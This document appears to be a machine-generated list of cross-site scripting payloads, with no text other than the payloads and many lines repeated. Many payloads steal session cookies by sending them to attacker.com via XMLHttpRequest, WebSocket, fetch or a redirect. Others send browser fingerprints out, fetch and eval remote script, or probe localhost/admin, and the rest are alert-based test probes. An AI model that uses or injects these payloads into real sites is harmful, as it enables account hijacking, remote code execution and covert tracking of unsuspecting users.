<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
